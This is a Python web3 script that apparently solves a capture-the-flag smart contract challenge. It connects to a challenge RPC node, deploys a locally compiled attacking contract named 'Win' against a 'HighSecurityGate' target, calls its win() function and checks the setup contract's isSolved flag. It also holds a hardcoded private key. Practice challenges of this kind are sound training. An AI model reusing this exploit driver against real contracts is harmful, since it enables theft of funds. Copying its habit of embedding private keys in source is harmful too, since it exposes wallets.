from web3 import Web3
from solcx import compile_source
import json

"""
Private key     :  0x568b78ec9236d258b399c5c80c9bfad39818818531a6fcafc921e40b0c022799
Address         :  0x82610fF9A6C492B1B69fD5768E01569605991D21
Target contract :  0x2b5155353071dcC03c3eBa7Fb29B761AD7C1d960
Setup contract  :  0xB1c0D656F51086B0354e52eb469AAF93f140C796
"""
priv_key = '0x568b78ec9236d258b399c5c80c9bfad39818818531a6fcafc921e40b0c022799'
self_addr = '0x82610fF9A6C492B1B69fD5768E01569605991D21'
setup_contract_addr = '0xB1c0D656F51086B0354e52eb469AAF93f140C796'
high_security_gate_addr = '0x2b5155353071dcC03c3eBa7Fb29B761AD7C1d960'

rpc_url = 'http://165.22.116.7:32192'
w3 = Web3(Web3.HTTPProvider(rpc_url))
if not w3.is_connected():
    print("[-] error to connect")
    exit(-1)
print('[+] Connected')

balance = w3.eth.get_balance(self_addr)
print("[*] My balance:", w3.from_wei(balance, 'ether'))

with open('./setup_abi.json') as f:
    setup_abi = json.load(f)
with open('./highSecurityGate_abi.json') as f:
    high_security_gate_abi = json.load(f)
with open('./badContract.sol') as f:
    contract_source = f.read()

compiled_sol = compile_source(contract_source, output_values=[
                              'abi', 'bin'])['<stdin>:Win']
# Instantiate and deploy contract
BadContract = w3.eth.contract(
    abi=compiled_sol['abi'], bytecode=compiled_sol['bin'])

# Submit the transaction that deploys the contract
tx = {
    'from': self_addr,
    'nonce': w3.eth.get_transaction_count(self_addr),
    'gas': 2000000,
}
tx_constr = BadContract.constructor().build_transaction(tx)
signed_tx = w3.eth.account.sign_transaction(tx_constr, priv_key)
tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
my_contract = w3.eth.wait_for_transaction_receipt(tx_hash)
print('[+] Contract deployed at address:', my_contract.contractAddress)

badContract = w3.eth.contract(
    address=my_contract.contractAddress, abi=compiled_sol['abi'])

tx_hash = badContract.functions.win().transact()
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

setup_contract = w3.eth.contract(setup_contract_addr, abi=setup_abi)
is_solved = setup_contract.functions.isSolved().call()
print("Win:", is_solved)
